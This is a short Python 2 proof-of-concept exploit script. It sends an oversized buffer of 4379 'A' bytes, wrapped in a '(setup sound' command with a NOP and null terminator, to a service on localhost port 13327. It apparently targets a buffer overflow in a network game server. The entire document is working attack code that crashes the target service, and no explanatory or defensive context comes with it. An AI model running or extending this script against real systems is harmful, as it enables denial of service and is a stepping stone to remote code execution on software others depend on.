#!/usr/bin/env python
import socket, sys

if __name__ == '__main__':

	crash = "\x41" * 4379

	#\x11 = device control character
	#\x90 = NOP
	#\x00 = null

	buffer = "\x11(setup sound " + crash + "\x90\x00#"

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print "[!] Sending evil buffer..."
	sock.connect(("127.0.0.1", 13327))
	data = sock.recv(1024)
	print data

	sock.send(buffer)
	print "[*] Payload sent..."
	data = sock.recv(1024)
	print data

	sock.close()
	sys.exit(0)
	
